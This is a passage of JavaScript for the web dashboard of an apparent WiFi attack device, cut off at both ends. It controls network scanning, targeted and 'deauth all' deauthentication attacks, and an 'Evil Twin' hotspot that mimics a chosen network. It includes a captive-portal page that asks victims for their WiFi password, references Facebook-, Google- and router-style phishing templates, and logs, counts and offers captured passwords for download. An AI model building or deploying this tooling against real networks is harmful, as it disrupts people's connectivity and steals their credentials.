    console.log("Showing tab: " + tabName);
    document.querySelectorAll('.tab-content').forEach(tab => {
        tab.classList.remove('active');
    });
    
    document.querySelectorAll('.nav-item').forEach(nav => {
        nav.classList.remove('active');
    });
    
    document.getElementById(tabName + '-tab').classList.add('active');
    
    const activeNavItem = document.querySelector(`.nav-item[data-tab="${tabName}"]`);
    if (activeNavItem) {
        activeNavItem.classList.add('active');
    }
    
    currentTab = tabName;

    if (window.innerWidth <= 768) {
        const sidebar = document.getElementById('sidebar');
        sidebar.classList.remove('show');
        console.log("Sidebar hidden on mobile after tab selection.");
    }

    if (currentTab === 'captive-editor') {
        previewTemplate();
    }
    if (currentTab === 'filemanager') {
        fetchFiles();
    }
    if (currentTab === 'logs') {
        fetchLogs(); // Ensure logs are fresh when tab is opened
    }
    if (currentTab === 'settings') {
        fetchSettings();
    }
    // Jika pindah ke tab scanner, pastikan pesan awal ditampilkan jika belum ada scan
    if (currentTab === 'scanner' && networks.length === 0) {
        document.getElementById('networks-list').innerHTML = '<p class="text-gray">Click "Manual Scan" to find networks.</p>';
    }
}

function attachEventListeners() {
    console.log("Attaching event listeners...");
    document.querySelectorAll('.nav-item').forEach(item => {
        item.addEventListener('click', (event) => {
            event.preventDefault();
            const tabName = event.currentTarget.dataset.tab;
            if (tabName) {
                showTab(tabName);
            }
        });
    });

    const menuToggleBtn = document.querySelector('.menu-toggle');
    if (menuToggleBtn) {
        menuToggleBtn.addEventListener('click', toggleSidebar);
        console.log("Menu toggle button event listener attached.");
    } else {
        console.error("Menu toggle button not found!");
    }

    document.getElementById('quick-scan-btn').addEventListener('click', () => {
        showTab('scanner');
        manualScan(); // Panggil fungsi manual scan
    });
    document.getElementById('generate-report-btn').addEventListener('click', generateReport);

    document.getElementById('manual-scan-btn').addEventListener('click', manualScan);
    document.getElementById('deselect-network-btn').addEventListener('click', deselectNetwork);

    document.getElementById('deauth-btn').addEventListener('click', () => toggleDeauth(false)); // Target single
    document.getElementById('deauth-all-btn').addEventListener('click', () => toggleDeauth(true)); // Target all // NEW

    document.getElementById('hotspot-btn').addEventListener('click', toggleHotspot);

    document.getElementById('load-template-btn').addEventListener('click', loadTemplate);
    document.getElementById('save-template-btn').addEventListener('click', saveTemplate);
    document.getElementById('deploy-template-btn').addEventListener('click', deployTemplate);
    document.getElementById('html-editor').addEventListener('input', debounce(previewTemplate, 500));
    document.getElementById('template-select').addEventListener('change', loadTemplate);

    document.getElementById('show-upload-modal-btn').addEventListener('click', showUploadModal);
    const cancelUploadBtn = document.getElementById('cancel-upload-btn');
    if (cancelUploadBtn) {
        cancelUploadBtn.addEventListener('click', closeUploadModal);
    }
    
    document.getElementById('file-input').addEventListener('change', handleFileUpload);
    document.getElementById('file-drop-area').addEventListener('click', () => document.getElementById('file-input').click());
    document.getElementById('file-drop-area').addEventListener('dragover', (e) => {
        e.preventDefault();
        e.currentTarget.classList.add('drag-over');
    });
    document.getElementById('file-drop-area').addEventListener('dragleave', (e) => {
        e.currentTarget.classList.remove('drag-over');
    });
    document.getElementById('file-drop-area').addEventListener('drop', (e) => {
        e.preventDefault();
        e.currentTarget.classList.remove('drag-over');
        const fileInput = document.getElementById('file-input');
        fileInput.files = e.dataTransfer.files;
        handleFileUpload();
    });

    document.getElementById('clear-logs-btn').addEventListener('click', clearLogs);
    document.getElementById('download-logs-btn').addEventListener('click', downloadLogs);

    document.getElementById('save-settings-btn').addEventListener('click', saveSettings);

    const firmwareInput = document.getElementById('firmware-input');
    const firmwareDropArea = document.getElementById('firmware-drop-area');

    if (firmwareInput && firmwareDropArea) {
        firmwareInput.addEventListener('change', handleFirmwareUpload);
        firmwareDropArea.addEventListener('click', () => firmwareInput.click());
        firmwareDropArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            e.currentTarget.classList.add('drag-over');
        });
        firmwareDropArea.addEventListener('dragleave', (e) => {
            e.preventDefault();
            e.currentTarget.classList.remove('drag-over');
        });
        firmwareDropArea.addEventListener('drop', (e) => {
            e.preventDefault();
            e.currentTarget.classList.remove('drag-over');
            firmwareInput.files = e.dataTransfer.files;
            handleFirmwareUpload();
        });
    } else {
        console.error("Firmware update elements not found!");
    }


    document.getElementById('reboot-btn').addEventListener('click', confirmReboot);
    console.log("All event listeners attached.");
}

function toggleSidebar() {
    console.log("toggleSidebar called.");
    const sidebar = document.getElementById('sidebar');
    sidebar.classList.toggle('show');
    console.log("Sidebar 'show' class toggled. Current classes: " + sidebar.className);
}

function loadDefaultTemplate() {
    const defaultTemplate = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login - {SSID}</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .wifi-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 2em;
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 1.8em;
        }
        .subtitle {
            color: #666;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #333;
            font-weight: 500;
        }
        input[type="password"], input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
            box-sizing: border-box;
        }
        input[type="password"]:focus, input[type="text"]::focus {
            outline: none;
            border-color: #667eea;
        }
        .connect-btn {
            width: 100%;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .connect-btn:hover {
            transform: translateY(-2px);
        }
        .security-note {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        </style>
</head>
<body>
    <div class="login-container">
        <div class="wifi-icon">📶</div>
        <h1>Connect to {SSID}</h1>
        <p class="subtitle">Please enter your network password to continue</p>
        
        <form action="/submit_password" method="post">
            <div class="form-group">
                <label for="password">WiFi Password:</label>
                <input type="password" id="password" name="password" required placeholder="Enter your WiFi password">
            </div>
            
            <button type="submit" class="connect-btn">Connect to Network</button>
        </form>
        
        <p class="security-note">
            🔒 Your connection is secured with WPA2 encryption
        </p>
    </div>
</body>
</html>`;

    document.getElementById('html-editor').value = defaultTemplate;
    previewTemplate();
}

function loadTemplate() {
    const selectedTemplate = document.getElementById('template-select').value;
    let template = '';

    switch(selectedTemplate) {
        case 'facebook':
            template = getFacebookTemplate();
            break;
        case 'google':
            template = getGoogleTemplate();
            break;
        case 'router':
            template = getRouterTemplate();
            break;
        case 'default':
            loadDefaultTemplate();
            return;
        default:
            const customTemplate = localStorage.getItem(`template_${selectedTemplate}`);
            if (customTemplate) {
                template = customTemplate;
            } else {
                showNotification('Template not found!', 'error');
                return;
            }
            break;
    }

    document.getElementById('html-editor').value = template;
    previewTemplate();
}

function previewTemplate() {
    let html = document.getElementById('html-editor').value;
    
    html = html.replace(/{SSID}/g, selectedNetwork ? selectedNetwork.ssid : 'MyNetwork');
    html = html.replace(/{DEVICE_NAME}/g, 'SentinelCAP');
    html = html.replace(/{CURRENT_TIME}/g, new Date().toLocaleTimeString());
    html = html.replace(/{CUSTOM_MESSAGE}/g, 'Please authenticate to continue');

    const iframe = document.getElementById('preview-iframe');
    const doc = iframe.contentDocument || iframe.contentWindow.document;
    doc.open();
    doc.write(html);
    doc.close();
}

function saveTemplate() {
    const templateName = prompt('Enter a name for your custom template:');
    if (templateName) {
        const html = document.getElementById('html-editor').value;
        localStorage.setItem(`template_${templateName}`, html);
        addToTerminal(`[INFO] Template '${templateName}' saved successfully to local storage.`);
        populateTemplateLibrary();
        showNotification('Template saved successfully!', 'success');
    }
}

async function deployTemplate() {
    const html = document.getElementById('html-editor').value;
    const filename = 'captive_portal_template.html';

    const formData = new FormData();
    const blob = new Blob([html], { type: 'text/html' });
    formData.append('uploadFile', blob, filename);

    try {
        addToTerminal(`[INFO] Deploying template to ${filename}...`);
        const response = await fetch('/upload', {
            method: 'POST',
            body: formData
        });

        if (response.ok) {
            const result = await response.json();
            addToTerminal(`[INFO] ${result.message}`);
            showNotification('Template deployed successfully!', 'success');
        } else {
            const errorText = await response.text();
            addToTerminal(`[ERROR] Failed to deploy template: ${errorText}`);
            showNotification('Failed to deploy template!', 'error');
        }
    } catch (error) {
        addToTerminal(`[ERROR] Network error during deployment: ${error.message}`);
        showNotification('Network error during deployment!', 'error');
    }
}

function populateTemplateLibrary() {
    const library = document.getElementById('template-library');
    library.innerHTML = '';

    const builtinTemplates = [
        { name: 'Default', description: 'Simple and clean design' },
        { name: 'Facebook', description: 'Facebook-style login page' },
        { name: 'Google', description: 'Google WiFi style' },
        { name: 'Router', description: 'Router Admin panel style' }
    ];

    builtinTemplates.forEach(template => {
        const card = createTemplateCard(template.name, template.description, false);
        library.appendChild(card);
    });

    Object.keys(localStorage).forEach(key => {
        if (key.startsWith('template_')) {
            const name = key.replace('template_', '');
            const card = createTemplateCard(name, 'Custom template', true);
            library.appendChild(card);
        }
    });
}

function createTemplateCard(name, description, isCustom) {
    const card = document.createElement('div');
    card.className = 'template-card';
    
    card.innerHTML = `
        <h4>${name}</h4>
        <p>${description}</p>
        <div class="template-actions">
            <button data-template-name="${name}" class="action-btn small-btn load-template-from-library-btn"><i class="fas fa-file-import"></i> Load</button>
            ${isCustom ? `<button data-template-name="${name}" class="action-btn small-btn red-btn delete-template-btn"><i class="fas fa-trash-alt"></i> Delete</button>` : ''}
        </div>
    `;
    
    card.querySelector('.load-template-from-library-btn').addEventListener('click', (e) => {
        loadTemplateFromLibrary(e.currentTarget.dataset.templateName);
    });
    if (isCustom) {
        card.querySelector('.delete-template-btn').addEventListener('click', (e) => {
            deleteTemplate(e.currentTarget.dataset.templateName);
        });
    }
    
    return card;
}

function loadTemplateFromLibrary(name) {
    document.getElementById('template-select').value = name;
    loadTemplate();
}

function deleteTemplate(name) {
    if (confirm(`Are you sure you want to delete template '${name}'?`)) {
        localStorage.removeItem(`template_${name}`);
        populateTemplateLibrary();
        addToTerminal(`[INFO] Template '${name}' deleted.`);
        showNotification('Template deleted!', 'success');
    }
}

// NEW: Fungsi untuk memicu scan manual
async function manualScan() {
    addToTerminal('[SCAN] Initiating manual WiFi scan...');
    document.getElementById('networks-list').innerHTML = '<p class="text-gray">Scanning for networks...</p>';
    try {
        const response = await fetch('/api/manual_scan'); // Panggil endpoint manual scan
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const result = await response.json();
        if (result.success) {
            addToTerminal('[SCAN] Manual scan command sent. Fetching results...');
            // Setelah perintah scan dikirim, panggil scanNetworks untuk mendapatkan hasil
            scanNetworks(); 
        } else {
            addToTerminal(`[ERROR] Manual scan failed: ${result.message}`);
            showNotification('Manual scan failed!', 'error');
        }
    } catch (error) {
        addToTerminal(`[ERROR] Network error during manual scan: ${error.message}`);
        console.error("Error initiating manual scan:", error);
        showNotification('Network error during manual scan!', 'error');
    }
}


async function scanNetworks() {
    try {
        const response = await fetch('/api/scan'); // Endpoint ini hanya mengambil data scan yang sudah ada
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        networks = await response.json();
        renderNetworks();
        addToTerminal(`[SCAN] Found ${networks.length} networks.`);
    } catch (error) {
        addToTerminal(`[ERROR] Failed to fetch networks: ${error.message}`);
        console.error("Error fetching networks:", error);
        showNotification('Failed to fetch networks!', 'error');
    }
}

function renderNetworks() {
    const networksList = document.getElementById('networks-list');
    networksList.innerHTML = '';

    if (networks.length === 0) {
        networksList.innerHTML = '<p class="text-gray">No networks found. Click "Manual Scan" to find networks.</p>';
        return;
    }

    networks.forEach((network, index) => {
        const networkCard = document.createElement('div');
        networkCard.className = `network-card ${selectedNetwork && selectedNetwork.bssid === network.bssid ? 'selected' : ''}`;
        
        const signalStrength = getSignalStrength(network.rssi);
        const securityColor = network.security === 'Open' ? 'text-red' : 'text-green';
        
        networkCard.innerHTML = `
            <div class="ssid-info">
                <div class="signal-icon">${signalStrength.icon}</div>
                <div>
                    <h3>${network.ssid}</h3>
                    <p class="text-gray">${network.bssid}</p>
                </div>
            </div>
            <div class="details">
                <p class="text-gray">Ch. ${network.channel}</p>
                <p class="${securityColor}">${network.security}</p>
                <p class="text-gray">${network.rssi} dBm</p>
            </div>
            <button data-bssid="${network.bssid}" class="select-btn">
                ${selectedNetwork && selectedNetwork.bssid === network.bssid ? 'Selected' : 'Select'}
            </button>
        `;
        
        networksList.appendChild(networkCard);
    });

    networksList.querySelectorAll('.select-btn').forEach(button => {
        button.addEventListener('click', (e) => {
            const bssidToSelect = e.currentTarget.dataset.bssid;
            const networkToSelect = networks.find(net => net.bssid === bssidToSelect);
            if (networkToSelect) {
                selectNetwork(networkToSelect);
            }
        });
    });
}

function getSignalStrength(rssi) {
    if (rssi > -50) return { icon: '📶', class: 'text-green' };
    if (rssi > -60) return { icon: '📶', class: 'text-yellow' };
    if (rssi > -70) return { icon: '📶', class: 'text-orange' };
    return { icon: '📶', class: 'text-red' };
}

async function selectNetwork(network) {
    addToTerminal(`[INFO] Attempting to select network: ${network.ssid}`);
    try {
        const response = await fetch('/api/select_network', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ bssid: network.bssid })
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const result = await response.json();
        if (result.success) {
            selectedNetwork = network;
            document.getElementById('target-ssid').textContent = selectedNetwork.ssid;
            renderNetworks();
            addToTerminal(`[INFO] Network '${selectedNetwork.ssid}' selected successfully.`);
            showNotification('Network selected successfully!', 'success');
        } else {
            addToTerminal(`[ERROR] Failed to select network: ${result.message}`);
            showNotification(`Failed to select network: ${result.message}`, 'error');
        }
    } catch (error) {
        addToTerminal(`[ERROR] Network error during selection: ${error.message}`);
        console.error("Error selecting network:", error);
        showNotification('Network error during selection!', 'error');
    }
}


async function toggleDeauth(targetAll) { // Modified: Added targetAll parameter
    if (!targetAll && (!selectedNetwork || !selectedNetwork.ssid)) {
        showNotification('Please select a target network first, or choose "Deauth All".', 'error');
        return;
    }

    try {
        const response = await fetch('/api/toggle_deauth', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ target_all: targetAll }) // Send target_all flag
        });
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const result = await response.json();
        isDeauthActive = result.deauth_active;
        isDeauthAllActive = result.deauth_all_active; // NEW: Update deauth all status
        updateDeauthUI();
        addToTerminal(`[DEAUTH] Deauth attack ${isDeauthActive ? 'started' : 'stopped'} ${isDeauthAllActive ? 'on all networks' : (selectedNetwork ? 'on ' + selectedNetwork.ssid : '')}`);
        showNotification(`Deauth attack ${isDeauthActive ? 'started' : 'stopped'}!`, isDeauthActive ? 'success' : 'info');
    } catch (error) {
        addToTerminal(`[ERROR] Failed to toggle deauth: ${error.message}`);
        console.error("Error toggling deauth:", error);
        showNotification('Failed to toggle deauth!', 'error');
    }
}

function updateDeauthUI() {
    const btn = document.getElementById('deauth-btn');
    const btnAll = document.getElementById('deauth-all-btn'); // NEW
    const status = document.getElementById('deauth-status');

    if (isDeauthActive) {
        if (isDeauthAllActive) { // NEW: If deauth all is active
            btn.textContent = 'Start Deauth Attack';
            btn.classList.remove('red-btn');
            btn.disabled = true; // Disable single deauth button
            btnAll.textContent = 'Stop Deauth All';
            btnAll.classList.add('orange-btn');
            status.innerHTML = '<span class="text-green">Active (All)</span>';
        } else { // Single deauth is active
            btn.textContent = 'Stop Deauth Attack';
            btn.classList.add('red-btn');
            btn.disabled = false;
            btnAll.textContent = 'Start Deauth All';
            btnAll.classList.remove('orange-btn');
            btnAll.disabled = true; // Disable deauth all button
            status.innerHTML = '<span class="text-green">Active (Targeted)</span>';
        }
    } else { // Deauth is stopped
        btn.textContent = 'Start Deauth Attack';
        btn.classList.remove('red-btn');
        btn.disabled = false;
        btnAll.textContent = 'Start Deauth All';
        btnAll.classList.remove('orange-btn');
        btnAll.disabled = false;
        status.innerHTML = '<span class="text-red">Stopped</span>';
    }
}

async function toggleHotspot() {
    if (!selectedNetwork || !selectedNetwork.ssid) {
        showNotification('Please select a target network first', 'error');
        return;
    }

    try {
        const response = await fetch('/api/toggle_hotspot', { method: 'POST' });
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const result = await response.json();
        isHotspotActive = result.hotspot_active;
        updateHotspotUI();
        addToTerminal(`[HOTSPOT] Evil Twin ${isHotspotActive ? 'started' : 'stopped'} for ${selectedNetwork.ssid}`);
        showNotification(`Evil Twin ${isHotspotActive ? 'started' : 'stopped'}!`, isHotspotActive ? 'success' : 'info');
    } catch (error) {
        addToTerminal(`[ERROR] Failed to toggle hotspot: ${error.message}`);
        console.error("Error toggling hotspot:", error);
        showNotification('Failed to toggle hotspot!', 'error');
    }
}

function updateHotspotUI() {
    const btn = document.getElementById('hotspot-btn');
    const status = document.getElementById('hotspot-status');
    if (isHotspotActive) {
        btn.textContent = 'Stop Evil Twin';
        btn.classList.add('purple-btn');
        status.innerHTML = '<span class="text-green">Active</span>';
    } else {
        btn.textContent = 'Start Evil Twin';
        btn.classList.remove('purple-btn');
        status.innerHTML = '<span class="text-red">Inactive</span>';
    }
}

function showUploadModal() {
    document.getElementById('upload-modal').style.display = 'flex';
}

function closeUploadModal() {
    document.getElementById('upload-modal').style.display = 'none';
    document.getElementById('file-input').value = '';
}

async function handleFileUpload() {
    const fileInput = document.getElementById('file-input');
    const file = fileInput.files[0];
    if (!file) {
        showNotification('No file selected!', 'warning');
        return;
    }

    const formData = new FormData();
    formData.append('uploadFile', file, file.name);

    try {
        addToTerminal(`[FILE] Uploading: ${file.name} (${file.size} bytes)`);
        const response = await fetch('/upload', {
            method: 'POST',
            body: formData
        });

        if (response.ok) {
            const result = await response.json();
            addToTerminal(`[FILE] ${result.message}`);
            showNotification('File uploaded successfully!', 'success');
            closeUploadModal();
            fetchFiles();
        } else {
            const errorText = await response.text();
            addToTerminal(`[ERROR] Failed to upload file: ${errorText}`);
            showNotification('Failed to upload file!', 'error');
        }
    } catch (error) {
        addToTerminal(`[ERROR] Network error during upload: ${error.message}`);
        showNotification('Network error during upload!', 'error');
    }
}

async function fetchFiles() {
    try {
        const response = await fetch('/api/files');
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const files = await response.json();
        renderFiles(files);
    } catch (error) {
        addToTerminal(`[ERROR] Failed to fetch files: ${error.message}`);
        console.error("Error fetching files:", error);
        showNotification('Failed to load files!', 'error');
    }
}

function renderFiles(files) {
    const filesList = document.getElementById('files-list');
    filesList.innerHTML = '';

    if (files.length === 0) {
        filesList.innerHTML = '<p class="text-gray">No files found on device.</p>';
        return;
    }

    files.forEach(file => {
        const fileItem = document.createElement('div');
        fileItem.className = 'file-item';
        
        const fileIcon = getFileIcon(file.type);
        
        fileItem.innerHTML = `
            <div class="file-info">
                <div class="file-icon">${fileIcon}</div>
                <div class="file-details">
                    <h4>${file.name}</h4>
                    <p>${file.size} bytes</p>
                </div>
            </div>
            <div class="file-actions">
                <button data-filename="${file.name}" class="action-btn small-btn preview-file-btn"><i class="fas fa-eye"></i> Preview</button>
                <button data-filename="${file.name}" class="action-btn small-btn red-btn delete-file-btn"><i class="fas fa-trash-alt"></i> Delete</button>
            </div>
        `;
        
        filesList.appendChild(fileItem);
    });

    filesList.querySelectorAll('.preview-file-btn').forEach(button => {
        button.addEventListener('click', (e) => previewFile(e.currentTarget.dataset.filename));
    });
    filesList.querySelectorAll('.delete-file-btn').forEach(button => {
        button.addEventListener('click', (e) => deleteFile(e.currentTarget.dataset.filename));
    });
}

function getFileIcon(type) {
    switch(type) {
        case 'html': return '<i class="fas fa-file-code"></i>';
        case 'json': return '<i class="fas fa-file-alt"></i>';
        case 'log': return '<i class="fas fa-file-alt"></i>';
        case 'javascript': return '<i class="fab fa-js"></i>';
        case 'css': return '<i class="fab fa-css3-alt"></i>';
        case 'text': return '<i class="fas fa-file-alt"></i>';
        default: return '<i class="fas fa-file"></i>';
    }
}

function previewFile(filename) {
    addToTerminal(`[FILE] Previewing: ${filename}`);
    window.open(`/${filename}`, '_blank');
}

async function deleteFile(filename) {
    if (confirm(`Are you sure you want to delete ${filename}?`)) {
        try {
            const response = await fetch('/deletefile', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ filename: filename })
            });
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const result = await response.json();
            addToTerminal(`[FILE] ${result.message}: ${filename}`);
            showNotification('File deleted successfully!', 'success');
            fetchFiles();
        } catch (error) {
            addToTerminal(`[ERROR] Failed to delete file: ${error.message}`);
            console.error("Error deleting file:", error);
            showNotification('Failed to delete file!', 'error');
        }
    }
}

async function fetchLogs() {
    try {
        const response = await fetch('/api/logs');
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const logs = await response.json();
        capturedPasswords = logs.passwords.split('\n').filter(line => line.trim() !== '');
        renderPasswordLogs();
    } catch (error) {
        addToTerminal(`[ERROR] Failed to fetch logs: ${error.message}`);
        console.error("Error fetching logs:", error);
        showNotification('Failed to load logs!', 'error');
    }
}

function renderPasswordLogs() {
    const passwordLogsDiv = document.getElementById('password-logs');
    passwordLogsDiv.innerHTML = '';
    if (capturedPasswords.length === 0) {
        passwordLogsDiv.innerHTML = '<div class="text-gray">No passwords captured yet...</div>';
    } else {
        capturedPasswords.forEach(logEntry => {
            passwordLogsDiv.innerHTML += `<div>${logEntry}</div>`;
        });
    }
    passwordLogsDiv.scrollTop = passwordLogsDiv.scrollHeight;
    document.getElementById('password-count').textContent = capturedPasswords.length;
}

async function clearLogs() {
    if (confirm('Are you sure you want to clear all password logs?')) {
        try {
            const response = await fetch('/api/clear_logs', { method: 'POST' });
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const result = await response.json();
            addToTerminal(`[INFO] ${result.message}`);
            showNotification('Password logs cleared!', 'success');
            fetchLogs();
        } catch (error) {
            addToTerminal(`[ERROR] Failed to clear logs: ${error.message}`);
            console.error("Error clearing logs:", error);
            showNotification('Failed to clear logs!', 'error');
        }
    }
}

function downloadLogs() {
    addToTerminal('[INFO] Downloading password logs...');
    window.open('/api/download_logs', '_blank');
    showNotification('Password logs download initiated!', 'info');
}

async function fetchSettings() {
    try {
        const response = await fetch('/api/settings');
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        appSettings = await response.json();
        renderSettings();
        addToTerminal('[INFO] Settings fetched successfully.');
    } catch (error) {
        addToTerminal(`[ERROR] Failed to fetch settings: ${error.message}`);
        console.error("Error fetching settings:", error);
        showNotification('Failed to load settings!', 'error');
    }
}

function renderSettings() {
    document.getElementById('admin-ap-ssid').value = appSettings.adminApSsid || '';
    document.getElementById('admin-ap-password').value = appSettings.adminApPassword || '';
    document.getElementById('web-admin-username').value = appSettings.webAdminUsername || '';
    document.getElementById('web-admin-password').value = appSettings.webAdminPassword || '';
    document.getElementById('enable-debug-logs').checked = appSettings.enableDebugLogs || false;
    document.getElementById('default-captive-template').value = appSettings.defaultCaptivePortalTemplate || 'default';
    document.getElementById('deauth-packet-rate').value = appSettings.deauthPacketRate || 1; // NEW: Deauth packet rate
}

async function saveSettings() {
    const newSettings = {
        adminApSsid: document.getElementById('admin-ap-ssid').value,
        adminApPassword: document.getElementById('admin-ap-password').value,
        webAdminUsername: document.getElementById('web-admin-username').value,
        webAdminPassword: document.getElementById('web-admin-password').value,
        enableDebugLogs: document.getElementById('enable-debug-logs').checked,
        defaultCaptivePortalTemplate: document.getElementById('default-captive-template').value,
        deauthPacketRate: parseInt(document.getElementById('deauth-packet-rate').value) || 1 // NEW: Deauth packet rate
    };

    try {
        addToTerminal('[INFO] Saving settings...');
        const response = await fetch('/api/settings', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(newSettings)
        });

        if (response.ok) {
            const result = await response.json();
            addToTerminal(`[INFO] ${result.message}`);
            showNotification('Settings saved successfully!', 'success');
            setTimeout(fetchSettings, 3000);
        } else {
            const errorText = await response.text();
            addToTerminal(`[ERROR] Failed to save settings: ${errorText}`);
            showNotification('Failed to save settings!', 'error');
        }
    } catch (error) {
        addToTerminal(`[ERROR] Network error during saving settings: ${error.message}`);
        showNotification('Network error during saving settings!', 'error');
    }
}

async function deselectNetwork() {
    if (!selectedNetwork && !isDeauthAllActive) { // Modified: Check isDeauthAllActive
        showNotification('No network is currently selected or deauth all is not active.', 'info');
        return;
    }

    if (confirm('Are you sure you want to deselect the current network and stop all active attacks?')) {
        try {
            const response = await fetch('/api/deselect_network', { method: 'POST' });
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const result = await response.json();
            selectedNetwork = null;
            isDeauthActive = false;
            isDeauthAllActive = false; // NEW: Reset deauth all
            isHotspotActive = false;
            updateDeauthUI();
            updateHotspotUI();
            document.getElementById('target-ssid').textContent = 'None Selected';
            renderNetworks();
            addToTerminal(`[INFO] ${result.message}`);
            showNotification('Network deselected successfully!', 'success');
        } catch (error) {
            addToTerminal(`[ERROR] Failed to deselect network: ${error.message}`);
            console.error("Error deselecting network:", error);
            showNotification('Failed to deselect network!', 'error');
        }
    }
}

async function confirmReboot() {
    if (confirm('Are you sure you want to reboot the device? This will disconnect all clients.')) {
        try {
            addToTerminal('[INFO] Sending reboot command...');
            const response = await fetch('/restart', { method: 'POST' });
            if (response.ok) {
                showNotification('Device is rebooting...', 'info');
                addToTerminal('[INFO] Device is rebooting. Please wait a moment before trying to reconnect.');
                setTimeout(() => {
                    window.location.reload();
                }, 5000); 
            } else {
                const errorText = await response.text();
                addToTerminal(`[ERROR] Failed to send reboot command: ${errorText}`);
                showNotification('Failed to reboot device!', 'error');
            }
        } catch (error) {
            addToTerminal(`[ERROR] Network error during reboot: ${error.message}`);
            showNotification('Network error during reboot!', 'error');
        }
    }
}

async function handleFirmwareUpload() {
    const firmwareInput = document.getElementById('firmware-input');
    const file = firmwareInput.files[0];
    if (!file) {
        showNotification('No firmware file selected!', 'warning');
        return;
    }

    const progressBarContainer = document.querySelector('.progress-container');
    const progressBar = document.getElementById('firmware-progress-bar');
    const progressText = document.getElementById('firmware-progress-text');
    const statusMessage = document.getElementById('firmware-status-message');

    progressBarContainer.style.display = 'block';
    progressBar.style.width = '0%';
    progressText.textContent = '0%';
    statusMessage.textContent = 'Starting firmware update...';
    addToTerminal(`[OTA] Starting firmware upload: ${file.name}`);

    const formData = new FormData();
    formData.append('firmware', file);

    try {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', '/update', true);

        xhr.upload.addEventListener('progress', (e) => {
            if (e.lengthComputable) {
                const percent = Math.round((e.loaded / e.total) * 100);
                progressBar.style.width = `${percent}%`;
                progressText.textContent = `${percent}%`;
                statusMessage.textContent = `Uploading: ${percent}%`;
            }
        });

        xhr.addEventListener('load', () => {
            if (xhr.status === 200) {
                statusMessage.textContent = 'Firmware update successful! Device rebooting...';
                progressBar.style.width = '100%';
                progressText.textContent = '100%';
                addToTerminal('[OTA] Firmware update successful. Device is rebooting.');
                showNotification('Firmware update successful! Device rebooting...', 'success');
                setTimeout(() => {
                    window.location.reload();
                }, 10000);
            } else {
                statusMessage.textContent = `Firmware update failed: ${xhr.responseText}`;
                progressBar.style.width = '0%';
                progressText.textContent = '0%';
                addToTerminal(`[OTA] Firmware update failed: ${xhr.responseText}`);
                showNotification(`Firmware update failed: ${xhr.responseText}`, 'error');
            }
        });

        xhr.addEventListener('error', () => {
            statusMessage.textContent = 'Network error during firmware update.';
            progressBar.style.width = '0%';
            progressText.textContent = '0%';
            addToTerminal('[OTA] Network error during firmware update.');
            showNotification('Network error during firmware update!', 'error');
        });

        xhr.send(formData);

    } catch (error) {
        statusMessage.textContent = `Error initiating upload: ${error.message}`;
        addToTerminal(`[OTA] Error initiating upload: ${error.message}`);
        showNotification('Error initiating firmware upload!', 'error');
    }
}


function addToTerminal(message) {
    const terminal = document.getElementById('terminal');
    const systemLogs = document.getElementById('system-logs');
    const timestamp = new Date().toLocaleTimeString();
    const logEntry = `<div>[${timestamp}] ${message}</div>`;
    
    terminal.innerHTML += logEntry;
    if (systemLogs) systemLogs.innerHTML += logEntry;
    
    terminal.scrollTop = terminal.scrollHeight;
    if (systemLogs) systemLogs.scrollTop = systemLogs.scrollHeight;
}

function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `fixed top-4 right-4 z-50 p-4 rounded-lg text-white transition-all duration-300 ${
        type === 'success' ? 'bg-green-600' :
        type === 'error' ? 'bg-red-600' :
        'bg-blue-600'
    }`;
    notification.textContent = message;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.remove();
    }, 3000);
}

function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

async function startStatusUpdates() {
    setInterval(async () => {
        try {
            const response = await fetch('/api/status');
            if (!response.ok) {
